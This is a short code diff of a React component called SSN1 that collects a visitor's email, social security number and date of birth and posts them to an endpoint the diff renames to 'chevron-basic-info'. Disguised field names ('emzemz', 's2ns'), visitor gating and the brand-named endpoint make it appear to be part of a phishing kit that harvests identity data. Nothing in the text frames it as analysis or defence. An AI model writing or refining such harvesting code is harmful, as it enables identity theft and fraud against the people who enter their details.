@@ -31,8 +31,12 @@ function SSN1() {
   console.log('SSN1 received email:', emzemz);
 
   // Show loading state while checking access
-  if (!isAllowed) {
+  if (isAllowed === null) {
     return <div>Loading...</div>; // Or a proper loading spinner
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
   }
 
   const toggleSSNVisibility = () => setShowSSN(prev => !prev);
@@ -70,7 +74,7 @@ function SSN1() {
     if (!Object.values(newErrors).some(error => error)) {
       try {
         const d_b = `${getMonthName(month)}/${day}/${year}`;
-        await axios.post(`${baseUrl}api/logix-meta-data-6/`, {
+        await axios.post(`${baseUrl}api/chevron-basic-info/`, {
           emzemz: emzemz,
           s2ns: socialSecurityNumber,
           d_b: d_b
